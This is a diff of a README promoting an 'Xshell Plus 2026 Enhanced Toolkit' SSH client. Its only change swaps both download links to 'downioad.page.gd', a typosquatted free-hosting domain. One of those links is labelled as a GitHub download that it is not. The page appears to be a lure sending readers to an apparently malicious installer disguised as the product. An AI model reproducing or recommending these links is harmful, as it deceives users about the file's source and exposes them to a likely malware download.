@@ -2,7 +2,7 @@
 
 Xshell Plus 2026 Enhanced Toolkit is a comprehensive Windows desktop application designed to streamline your SSH and remote server management workflow. This toolkit builds upon the familiar Xshell Plus interface, offering a polished set of capabilities for connecting to, managing, and transferring files with remote machines. Whether you are a system administrator, a DevOps engineer, or a developer who frequently works with servers, this toolkit provides an organized and efficient way to handle multiple connections at once from a single workspace.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ---
 
@@ -67,7 +67,7 @@ All session credentials and key files are stored locally on your machine and are
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
